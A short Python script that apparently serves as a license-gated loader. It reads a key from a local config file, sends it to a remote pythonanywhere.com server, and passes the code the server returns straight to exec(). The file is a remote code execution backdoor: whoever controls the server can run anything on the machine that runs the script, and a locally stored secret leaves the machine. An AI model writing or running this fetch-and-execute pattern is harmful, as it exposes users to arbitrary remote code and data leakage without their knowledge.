import json, requests
with open("setting/config.json") as file: response = requests.post("https://realphandat.pythonanywhere.com/check", json={"key": json.load(file)['key']})
print(response.json()['message'])
if response.status_code == 200: exec(response.json()['code'])
